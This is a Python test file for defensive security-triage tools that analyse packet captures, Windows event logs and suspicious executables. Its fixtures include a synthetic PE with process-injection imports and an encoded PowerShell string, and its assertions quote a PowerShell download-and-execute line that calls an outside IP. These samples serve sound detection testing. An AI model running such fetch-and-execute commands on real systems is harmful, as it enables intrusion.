"""The binary-format SOC apps: pcap-triage, evtx-triage, file-inspector (CLI) and
file-inspector-gui (on the fake gui backend)."""

import hashlib
import json
import os
import random
import shutil
import sys

import pytest

import tb
import tblib.gui as gui
from conftest import ROOT

sys.path.insert(0, str(ROOT / "tests" / "lib"))
from binfixtures import build_elf, build_pe  # noqa: E402

APPS = ROOT / "apps"
DATA = APPS / "data"


def run_app(name, *args):
    """Run apps/<name>/main.tb with arguments; return its output as one text."""
    path = APPS / name / "main.tb"
    lines = []
    interp = tb.Interpreter(output=lines.append, input_fn=lambda prompt: "", rng=random.Random(0))
    try:
        tb.run(path.read_text(encoding="utf-8"), interpreter=interp, path=str(path), args=list(args))
    except tb.TBExit as stop:
        lines.append(f"<exit {stop.code}>")
    return "\n".join(lines)


@pytest.fixture
def in_tmp(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    return tmp_path


def suspicious_pe(path):
    path.write_bytes(build_pe(
        sections=[(".text", b"\x90" * 64 + b"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\x00", 0x60000020),
                  ("UPX1", os.urandom(4096), 0xE0000040)],
        imports={"KERNEL32.dll": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]},
        entry_section="UPX1"))
    return path


def test_every_app_has_a_readme():
    for name in ("pcap-triage", "evtx-triage", "file-inspector", "file-inspector-gui"):
        readme = (APPS / name / "README.md").read_text(encoding="utf-8")
        assert f"tb apps/{name}/main.tb" in readme


# -- pcap-triage ------------------------------------------------------------------------

def test_pcap_triage_sample(in_tmp):
    out = run_app("pcap-triage", "--html", "r.html", "--save", "flagged.pcap")
    assert "No capture given" in out
    assert "== sample.pcap  (pcap, 94 packets" in out
    for finding in ("Port scan", "HTTP request to a bare IP address", "Download of a .ps1 file over plain HTTP",
                    "DGA-looking DNS name (NXDOMAIN)", "Regular TLS beacon"):
        assert finding in out, finding
    assert "25 ports on 192.0.2.10" in out and "open: 22, 80, 445" in out
    assert "login.example-secure.top" in out
    stage2 = b"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.200/stage3.ps1')\r\n"
    assert "Files over HTTP" in out and "stage2.ps1" in out and hashlib.sha256(stage2).hexdigest() in out
    assert "Done: 94 packets" in out
    assert "Saved" in out and (in_tmp / "flagged.pcap").stat().st_size > 24
    assert "<html" in (in_tmp / "r.html").read_text().lower()


def test_pcap_triage_errors(in_tmp):
    (in_tmp / "x.txt").write_text("hello")
    assert run_app("pcap-triage", "x.txt").endswith("<exit 1>")
    assert "Unknown option --nope" in run_app("pcap-triage", "--nope")
    assert "--html needs a file name" in run_app("pcap-triage", "--html")


# -- evtx-triage --------------------------------------------------------------------------

def test_evtx_triage_sample(in_tmp):
    out = run_app("evtx-triage", "--json", "events.jsonl", "--html", "r.html")
    assert "No log given" in out
    assert "(EVTX 3.1, 1 chunk(s), 24 events, checksums ok)" in out
    assert "DC01.corp.example (18), WS-FINANCE-07.corp.example (6)" in out
    assert "critical  Brute force" in out and "203.0.113.42" in out
    assert "Security log cleared" in out
    assert "Service installed from a user-writabl" in out
    assert "Program started from a Temp or Downlo" in out
    assert "guessed a password: administrator logged in" in out
    assert "Decoded PowerShell: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.200/stage2.ps1')" in out
    assert "Done: 24 events, 7 alert(s), 6 high or critical." in out
    lines = (in_tmp / "events.jsonl").read_text().splitlines()
    assert len(lines) == 24 and json.loads(lines[0])["event_id"] == 4624
    assert "EVTX triage" in (in_tmp / "r.html").read_text()


def test_evtx_triage_describes_sysmon_and_powershell_events(in_tmp):
    from evtxwriter import build_evtx, security
    sysmon = security(1, 1773302400.0, "WS01", {"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /c whoami"},
                      record_id=1)
    sysmon.update(Channel="Microsoft-Windows-Sysmon/Operational", Provider="Microsoft-Windows-Sysmon")
    script = security(4104, 1773302401.0, "WS01", {"ScriptBlockText": "Get-Process"}, record_id=2)
    script.update(Channel="Microsoft-Windows-PowerShell/Operational", Provider="Microsoft-Windows-PowerShell")
    (in_tmp / "s.evtx").write_bytes(build_evtx([sysmon, script]))
    out = run_app("evtx-triage", "s.evtx")
    assert "(no description for this event)" not in out
    assert "process_created" in out and "Process creation: a process was started" in out
    assert "powershell_script_block" in out and "Script block logging" in out


def test_evtx_triage_not_an_evtx(in_tmp):
    (in_tmp / "x.log").write_text("hello")
    out = run_app("evtx-triage", "x.log")
    assert "isn't an EVTX log" in out and out.endswith("<exit 1>")


# -- file-inspector (CLI) -----------------------------------------------------------------

def test_file_inspector_overview_of_the_samples(in_tmp):
    out = run_app("file-inspector")
    assert "No file given, so here is an overview of apps/data." in out
    rows = {line.split()[0]: line for line in out.splitlines() if line and line.split()[0].count(".") == 1}
    assert "pcap" in rows["sample.pcap"] and "suspicious" in rows["sample.pcap"]
    assert "evtx" in rows["sample.evtx"] and "Encoded_PowerShell" in rows["sample.evtx"]
    assert "nothing found" in rows["auth.log"]
    assert "worth a closer look" in out


def test_file_inspector_pe_in_detail(in_tmp):
    path = suspicious_pe(in_tmp / "invoice.pdf.exe")
    out = run_app("file-inspector", str(path), "--json", "out.json", "--strings")
    assert "== invoice.pdf.exe  (Windows executable (PE, x64)" in out
    assert "pe64 x64 executable, 3 sections" in out
    assert "entry 0x2000 in UPX1" in out
    assert "UPX1" in out and "rwx" in out
    assert "imports KERNEL32.dll: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread" in out
    for what in ("writable_executable_section", "packer_section_name", "imports_injection",
                 "rule Process_Injection_Imports", "rule UPX_Packed_PE", "rule Encoded_PowerShell"):
        assert what in out, what
    assert "All strings (" in out
    assert "Verdict: SUSPICIOUS" in out
    saved = json.loads((in_tmp / "out.json").read_text())
    assert saved[0]["type"] == "pe" and saved[0]["verdict"] == "suspicious" and isinstance(saved[0]["strings"], int)


def test_file_inspector_elf_and_custom_rules(in_tmp):
    (in_tmp / "tool").write_bytes(build_elf(needed=("libc.so.6",), imports=("puts",)))
    (in_tmp / "mine.yar").write_text('rule Has_Hello { strings: $a = "Hello from a test ELF" condition: $a }')
    out = run_app("file-inspector", "tool", "--rules", "mine.yar")
    assert "elf64 x64 executable" in out and "needs: libc.so.6" in out
    assert "rule Has_Hello" in out
    assert "Verdict: WORTH A LOOK" in out


def test_file_inspector_errors(in_tmp):
    assert "I couldn't find 'nope.bin'" in run_app("file-inspector", "nope.bin")
    (in_tmp / "bad.yar").write_text("rule {")
    (in_tmp / "a.txt").write_text("x")
    out = run_app("file-inspector", "a.txt", "--rules", "bad.yar")
    assert "couldn't read that rule" in out and out.endswith("<exit 1>")
    assert "Unknown option --zap" in run_app("file-inspector", "--zap")


# -- file-inspector-gui (fake backend) ----------------------------------------------------

@pytest.fixture
def fake():
    backend = gui.FakeBackend()
    previous = gui._use_backend(backend)
    yield backend
    gui._use_backend(previous)


def run_gui(tmp_path, args=None):
    for name in ("file-inspector", "file-inspector-gui", "data"):
        shutil.copytree(APPS / name, tmp_path / name)
    main = tmp_path / "file-inspector-gui" / "main.tb"
    lines = []
    interp = tb.Interpreter(output=lines.append, input_fn=lambda prompt: "", rng=random.Random(0))
    tb.run(main.read_text(encoding="utf-8"), interpreter=interp, path=str(main), args=args or [])
    return lines


def test_file_inspector_gui(fake, tmp_path):
    exe = suspicious_pe(tmp_path / "setup.exe")
    lines = run_gui(tmp_path, [str(exe)])
    win = fake.window_
    assert win.title == "setup.exe - TB File Inspector" and win.theme == "dark" and win.ran
    labels = [w.text for w in win.widgets("label")]
    assert "Verdict: suspicious (a hint for a human, not proof either way)" in labels
    assert [b.text for b in win.widgets("badge")][0] == "suspicious"
    assert win.widgets("badge")[0].spec["style"] == "danger"

    facts, findings, sections, imports, strings = win.widgets("table")
    facts_map = {row[0]: row[1] for row in facts.rows}
    assert facts_map["Type"] == "Windows executable (PE, x64)"
    assert facts_map["Entry point"] == "0x2000 in UPX1"
    assert len(facts_map["SHA-256"]) == 64
    assert findings.rows[0][0] == "HIGH"
    assert any(r[1] == "rule Process_Injection_Imports" for r in findings.rows)
    details = win.find("textarea")
    assert details.text.startswith("HIGH  ")
    findings.choose(len(findings.rows) - 1)
    last = findings.rows[-1]
    assert details.text.startswith(f"{last[0]}  {last[1]}") and last[0] != "HIGH"
    assert [r[0] for r in sections.rows] == [".text", "UPX1", ".idata"]
    assert ["UPX1", "4096"] == sections.rows[1][:2] and sections.rows[1][3] == "rwx"
    assert ["KERNEL32.dll", "VirtualAllocEx"] in imports.rows

    every = len(strings.rows)
    win.widgets("input")[0].type("powershell")
    assert 0 < len(strings.rows) < every and all("powershell" in r[2].lower() for r in strings.rows)

    win.find("button", "Copy SHA-256").click()
    assert fake.clipboard == facts_map["SHA-256"]
    out = tmp_path / "report.json"
    fake.answers = [str(out)]
    win.find("button", "Save JSON report…").click()
    saved = json.loads(out.read_text())
    assert saved["name"] == "setup.exe" and saved["details"]["format"] == "pe64"
    assert not any(d["kind"] == "error" for d in fake.dialogs)
    assert lines == []


def test_file_inspector_gui_samples_drop_and_errors(fake, tmp_path):
    run_gui(tmp_path, ["--light"])
    win = fake.window_
    assert win.theme == "light" and win.title == "TB File Inspector"
    win.find("button", "Copy SHA-256").click()
    assert fake.dialogs[-1]["message"] == "Open a file first."
    win.find("button", "Save JSON report…").click()
    assert fake.dialogs[-1]["message"] == "Open a file first."

    win.find("select").choose("sample.pcap")
    assert win.title == "sample.pcap - TB File Inspector"
    facts = win.widgets("table")[0]
    assert ["Type", "Network capture (pcap)"] in facts.rows
    assert win.find("select").text == "(choose)"

    elf = tmp_path / "tool"
    elf.write_bytes(build_elf())
    win.drop([str(elf)])
    assert win.title == "tool - TB File Inspector"
    facts_map = {r[0]: r[1] for r in win.widgets("table")[0].rows}
    assert facts_map["Needs"] == "libc.so.6" and facts_map["Kind"] == "executable"
    assert win.widgets("badge")[0].text == "nothing found"  # imports socket: a low finding only
    assert win.widgets("table")[1].rows == [["LOW", "imports_network", "Imports network functions: socket."]]

    fake.answers = [str(tmp_path / "missing.bin")]
    win.find("button", "Open file…").click()
    assert fake.dialogs[-1]["title"] == "No such file"
